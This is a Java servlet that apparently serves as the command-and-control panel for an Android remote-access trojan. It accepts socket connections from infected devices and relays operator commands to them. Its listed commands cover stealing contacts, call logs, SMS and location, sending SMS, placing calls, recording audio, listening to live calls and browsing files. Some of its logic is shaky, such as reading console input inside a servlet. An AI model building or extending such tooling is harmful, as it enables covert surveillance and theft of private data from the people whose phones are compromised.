import javax.servlet.ServletException;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintStream;
import java.net.InetAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.Scanner;

@WebServlet(name = "ServerServlet")
public class ServerServlet extends HttpServlet {

    private ServerSocket serverSocket;
    private String command;
    private Socket socket;

    @Override
    public void init() throws ServletException {
        super.init();
        int PORT = 16520;

        try {
            serverSocket = new ServerSocket(PORT, 100, InetAddress.getByName("127.12.177.129"));
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    @Override
    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {

        /*PrintWriter out = resp.getWriter();
        out.println("<html> \n"
                + "<head> \n"
                + "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=ISO-8859-1\"> \n"
                + "<title> Client </title> \n"
                + "</head> \n"
                + "<body> \n"
                + "<form action=server method='POST'> \n"
                + "<input type='text' name='command' title='Command'/> \n"
                + "<input type='submit' value='Execute'/> \n"
                + "</form> \n"
                + "</body> \n"
                + "</html>");
        */
        command = req.getParameter("command");
        if (command.equals("login")) {
            new Thread(() -> {
                while (true) {
                    try {
                        socket = serverSocket.accept();
                        req.getRequestDispatcher("client.jsp").forward(req, resp);
                    } catch (IOException | ServletException e) {
                        e.printStackTrace();
                    }
                }
            }).start();
        } else {
            handle(socket, req, resp);
        }
    }

    @Override
    public void destroy() {
        if (serverSocket != null) {
            try {
                serverSocket.close();
                serverSocket = null;
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }

    private void handle (Socket socket, ServletRequest req, ServletResponse res) {

        try {
            PrintStream stream = new PrintStream(socket.getOutputStream());
            BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
            String response, print = "";

            stream.println(command);

            do {
                response = reader.readLine();
                Scanner in = new Scanner(System.in);
                String ask = "";
                switch (response) {
                    case "true":
                        print += "\n" + command + " executed successfully.\nResult code 1.";
                        break;
                    case "invalid":
                        print += "\nValid commands are,\n" +
                                "MakeToast\n" +
                                "GetContacts\n" +
                                "GetCallLog\n" +
                                "GetSMS\n" +
                                "SendSMS\n" +
                                "MakeCall\n" +
                                "GetLocation\n" +
                                "GetDeviceInfo\n" +
                                "OpenURL\n" +
                                "RecordAudio\n" +
                                "LiveCalls\n" +
                                "FileExplorer\n";
                        break;
                    case "false":
                        print += "\n" + command + " execution failed.\nResult code 0.";
                        break;
                    case "TO?":
                        ask = "To: ";
                        stream.println(in.nextLine());
                        break;
                    case "MESSAGE?":
                        ask = "Message: ";
                        stream.println(in.nextLine());
                        break;
                    case "URL?":
                        ask = "URL: ";
                        stream.println(in.nextLine());
                        break;
                    case "LENGTH?":
                        ask = "Record for(mins): ";
                        stream.println(in.nextLine());
                        String file = reader.readLine();
                        System.out.println("File: " + file);
                        break;
                    case "LISTEN FOR?":
                        ask = "Listen for(mins): ";
                        stream.println(in.nextLine());
                        break;
                    case "NEXT PATH?":
                        ask = "Next path: ";
                        stream.println(in.nextLine());
                        break;
                    default:
                        print += response + "\r\n";
                        break;
                }
            } while (!response.equals("true") && !response.equals("false") && !response.equals("invalid"));

            req.setAttribute("print", print);
            req.getRequestDispatcher("client.jsp").forward(req, res);
        } catch (ServletException | IOException e) {
            e.printStackTrace();
        }
    }
}
